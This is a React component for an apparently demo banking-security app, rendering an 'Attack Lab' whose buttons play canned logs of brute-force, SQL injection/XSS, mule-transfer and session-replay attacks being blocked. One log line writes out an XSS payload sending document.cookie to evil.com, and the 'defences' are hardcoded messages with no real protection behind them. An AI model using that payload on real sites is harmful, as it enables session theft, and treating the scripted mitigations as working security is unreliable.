import React, { useState } from "react";
import {
  Skull,
  Shield,
  Zap,
  Terminal,
  AlertTriangle,
  Play,
  RotateCcw,
  CheckCircle2,
  XCircle,
  Lock,
  Flame,
  Bug,
  ShieldAlert,
  Radio,
  Cpu,
} from "lucide-react";

interface LogMessage {
  id: string;
  timestamp: string;
  type: "ATTACK" | "DEFENSE" | "ALERT" | "INFO";
  text: string;
}

export const AttackLabView: React.FC = () => {
  const [activeAttack, setActiveAttack] = useState<string | null>(null);
  const [logs, setLogs] = useState<LogMessage[]>([
    {
      id: "1",
      timestamp: new Date().toLocaleTimeString(),
      type: "INFO",
      text: "Attack Lab initialized. Standing by for evaluator simulation vector...",
    },
  ]);
  const [threatLevel, setThreatLevel] = useState<"NORMAL" | "UNDER ATTACK" | "MITIGATED">("NORMAL");
  const [attacksMitigatedCount, setAttacksMitigatedCount] = useState<number>(14);

  const addLog = (type: "ATTACK" | "DEFENSE" | "ALERT" | "INFO", text: string) => {
    setLogs((prev) => [
      {
        id: Math.random().toString(),
        timestamp: new Date().toLocaleTimeString(),
        type,
        text,
      },
      ...prev,
    ]);
  };

  // 1. Launch Brute-Force Simulation
  const launchBruteForce = () => {
    setActiveAttack("BRUTE_FORCE");
    setThreatLevel("UNDER ATTACK");
    addLog("ATTACK", "🚨 INITIATING BRUTE-FORCE DICTIONARY ATTACK: Launching 50 rapid login requests/sec targeting admin@bankguard.ai...");

    let count = 0;
    const interval = setInterval(() => {
      count++;
      if (count <= 5) {
        addLog("ATTACK", `Attempt #${count * 10}: Password payload tested [Password123, Admin2026, Secret!123] - Failed (401)`);
      } else {
        clearInterval(interval);
        addLog("ALERT", "⚠️ RATE LIMIT THRESHOLD EXCEEDED: 50 failed attempts in 2.4s from IP 185.220.101.4");
        addLog("DEFENSE", "🛡️ WAF COUNTERMEASURE: Account locked for 30 minutes. IP 185.220.101.4 added to IPTables drop rules.");
        setThreatLevel("MITIGATED");
        setActiveAttack(null);
        setAttacksMitigatedCount((prev) => prev + 1);
      }
    }, 400);
  };

  // 2. Launch SQLi / XSS Attack
  const launchSqliXss = () => {
    setActiveAttack("SQLI");
    setThreatLevel("UNDER ATTACK");
    addLog("ATTACK", "🚨 INITIATING SQL INJECTION & XSS VECTOR: Payload: \"SELECT * FROM customers WHERE '1'='1' UNION <script>document.location='http://evil.com/steal?c='+document.cookie</script>\"");

    setTimeout(() => {
      addLog("ALERT", "⚠️ MALICIOUS PATTERN MATCHED: Input string contains forbidden SQL UNION keywords and raw script tags.");
      addLog("DEFENSE", "🛡️ WAF COUNTERMEASURE: Sanitized payload in API middleware. Stripped HTML tags and converted parameters via parameterized query binding. Return 400 Bad Request.");
      setThreatLevel("MITIGATED");
      setActiveAttack(null);
      setAttacksMitigatedCount((prev) => prev + 1);
    }, 1200);
  };

  // 3. Launch Mule Siphoning Attack
  const launchMuleSiphoning = () => {
    setActiveAttack("MULE_SIPHON");
    setThreatLevel("UNDER ATTACK");
    addLog("ATTACK", "🚨 INITIATING MULE SIPHONING VELOCITY ATTACK: Executing 8 rapid micro-transfers of ₹49,999 across accounts ACC-3304, ACC-4402, ACC-5512...");

    setTimeout(() => {
      addLog("ALERT", "⚠️ RANDOM FOREST VELOCITY ANOMALY: Transfer rate exceeds 300% historical baseline. D3 Topology detects circular loop A->B->C->A.");
      addLog("DEFENSE", "🛡️ AUTOMATED FREEZE DIRECTIVE: Source account freeze executed in 12ms. Inter-bank SWIFT hold initiated.");
      setThreatLevel("MITIGATED");
      setActiveAttack(null);
      setAttacksMitigatedCount((prev) => prev + 1);
    }, 1500);
  };

  // 4. Launch MitM Replay Attack
  const launchMitmReplay = () => {
    setActiveAttack("MITM_REPLAY");
    setThreatLevel("UNDER ATTACK");
    addLog("ATTACK", "🚨 INITIATING MAN-IN-THE-MIDDLE REPLAY ATTACK: Intercepted JWT session token replay payload submitted without valid X-CSRF-Token or Nonce.");

    setTimeout(() => {
      addLog("ALERT", "⚠️ CSRF & NONCE MISMATCH: Single-use cryptographic nonce already consumed at 22:50:12.");
      addLog("DEFENSE", "🛡️ REPLAY DEFENSE: Session invalidation response dispatched. Token revoked across Redis auth cache.");
      setThreatLevel("MITIGATED");
      setActiveAttack(null);
      setAttacksMitigatedCount((prev) => prev + 1);
    }, 1200);
  };

  const clearLogs = () => {
    setLogs([
      {
        id: "1",
        timestamp: new Date().toLocaleTimeString(),
        type: "INFO",
        text: "Terminal cleared. Standing by...",
      },
    ]);
  };

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="p-5 rounded-2xl bg-gradient-to-r from-slate-900 via-rose-950/50 to-slate-900 border border-slate-800 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="p-1.5 rounded-lg bg-rose-500/20 text-rose-400 border border-rose-500/30">
              <Skull className="w-5 h-5" />
            </span>
            <span className="text-xs font-mono font-bold uppercase tracking-wider text-rose-400">
              Module 3 • Live Cyber Attack Simulator
            </span>
          </div>
          <h2 className="text-2xl font-extrabold text-slate-100 tracking-tight">
            Attack Lab & Interactive Threat Mitigation Sandbox
          </h2>
          <p className="text-xs text-slate-400 mt-1 max-w-2xl">
            Designed for professors and evaluators. Launch live simulated cyber attacks with 1 click to test BankGuard's real-time defensive countermeasures and WAF sanitization.
          </p>
        </div>

        <div className="flex items-center gap-3">
          <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs flex items-center gap-2">
            <Radio className={`w-4 h-4 ${threatLevel === "UNDER ATTACK" ? "text-rose-500 animate-ping" : "text-emerald-400"}`} />
            <span className="text-slate-400">Status:</span>
            <span
              className={`font-bold ${
                threatLevel === "UNDER ATTACK"
                  ? "text-rose-400"
                  : threatLevel === "MITIGATED"
                  ? "text-sky-400"
                  : "text-emerald-400"
              }`}
            >
              {threatLevel}
            </span>
          </div>
        </div>
      </div>

      {/* Attack Launcher Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* 1. Brute Force */}
        <div className="p-4 rounded-2xl bg-slate-900 border border-slate-800 space-y-3 hover:border-slate-700 transition-colors">
          <div className="flex justify-between items-start">
            <span className="p-2 rounded-xl bg-rose-500/10 text-rose-400 border border-rose-500/20">
              <Flame className="w-5 h-5" />
            </span>
            <span className="text-[10px] font-mono text-slate-500">Vector #01</span>
          </div>
          <div>
            <h4 className="font-bold text-slate-100 text-sm">Brute-Force Dictionary</h4>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Simulates 50 rapid login dictionary payload requests.
            </p>
          </div>
          <button
            onClick={launchBruteForce}
            disabled={activeAttack !== null}
            className="w-full py-2 px-3 bg-rose-500 hover:bg-rose-400 text-slate-950 font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 transition-colors"
          >
            <Play className="w-3.5 h-3.5" />
            Launch Attack
          </button>
        </div>

        {/* 2. SQLi / XSS */}
        <div className="p-4 rounded-2xl bg-slate-900 border border-slate-800 space-y-3 hover:border-slate-700 transition-colors">
          <div className="flex justify-between items-start">
            <span className="p-2 rounded-xl bg-amber-500/10 text-amber-400 border border-amber-500/20">
              <Bug className="w-5 h-5" />
            </span>
            <span className="text-[10px] font-mono text-slate-500">Vector #02</span>
          </div>
          <div>
            <h4 className="font-bold text-slate-100 text-sm">SQL Injection / XSS</h4>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Injects raw SQL UNION & script tag cookies payload.
            </p>
          </div>
          <button
            onClick={launchSqliXss}
            disabled={activeAttack !== null}
            className="w-full py-2 px-3 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 transition-colors"
          >
            <Play className="w-3.5 h-3.5" />
            Launch Attack
          </button>
        </div>

        {/* 3. Mule Money Siphoning */}
        <div className="p-4 rounded-2xl bg-slate-900 border border-slate-800 space-y-3 hover:border-slate-700 transition-colors">
          <div className="flex justify-between items-start">
            <span className="p-2 rounded-xl bg-purple-500/10 text-purple-400 border border-purple-500/20">
              <ShieldAlert className="w-5 h-5" />
            </span>
            <span className="text-[10px] font-mono text-slate-500">Vector #03</span>
          </div>
          <div>
            <h4 className="font-bold text-slate-100 text-sm">Mule Siphoning</h4>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Rapid multi-account micro transfers to drain funds.
            </p>
          </div>
          <button
            onClick={launchMuleSiphoning}
            disabled={activeAttack !== null}
            className="w-full py-2 px-3 bg-purple-500 hover:bg-purple-400 text-slate-950 font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 transition-colors"
          >
            <Play className="w-3.5 h-3.5" />
            Launch Attack
          </button>
        </div>

        {/* 4. MitM Replay */}
        <div className="p-4 rounded-2xl bg-slate-900 border border-slate-800 space-y-3 hover:border-slate-700 transition-colors">
          <div className="flex justify-between items-start">
            <span className="p-2 rounded-xl bg-sky-500/10 text-sky-400 border border-sky-500/20">
              <Lock className="w-5 h-5" />
            </span>
            <span className="text-[10px] font-mono text-slate-500">Vector #04</span>
          </div>
          <div>
            <h4 className="font-bold text-slate-100 text-sm">MitM Session Replay</h4>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Replays stale session tokens without valid CSRF nonce.
            </p>
          </div>
          <button
            onClick={launchMitmReplay}
            disabled={activeAttack !== null}
            className="w-full py-2 px-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 transition-colors"
          >
            <Play className="w-3.5 h-3.5" />
            Launch Attack
          </button>
        </div>
      </div>

      {/* Terminal Output */}
      <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-3 font-mono text-xs">
        <div className="flex justify-between items-center border-b border-slate-800 pb-3">
          <div className="flex items-center gap-2">
            <Terminal className="w-4 h-4 text-emerald-400" />
            <span className="font-bold text-slate-200">Defensive Terminal Stream</span>
          </div>
          <div className="flex items-center gap-3 text-[11px]">
            <span className="text-slate-400">Total Threats Neutralized: <strong className="text-emerald-400">{attacksMitigatedCount}</strong></span>
            <button
              onClick={clearLogs}
              className="text-slate-400 hover:text-slate-200 p-1 flex items-center gap-1"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              Clear
            </button>
          </div>
        </div>

        <div className="h-64 overflow-y-auto space-y-2 pr-2">
          {logs.map((log) => (
            <div
              key={log.id}
              className={`p-2 rounded-lg border text-[11px] leading-relaxed ${
                log.type === "ATTACK"
                  ? "bg-rose-500/10 border-rose-500/30 text-rose-300"
                  : log.type === "ALERT"
                  ? "bg-amber-500/10 border-amber-500/30 text-amber-300"
                  : log.type === "DEFENSE"
                  ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-300 font-bold"
                  : "bg-slate-900 border-slate-800 text-slate-400"
              }`}
            >
              <span className="text-slate-500 mr-2">[{log.timestamp}]</span>
              <span>{log.text}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};
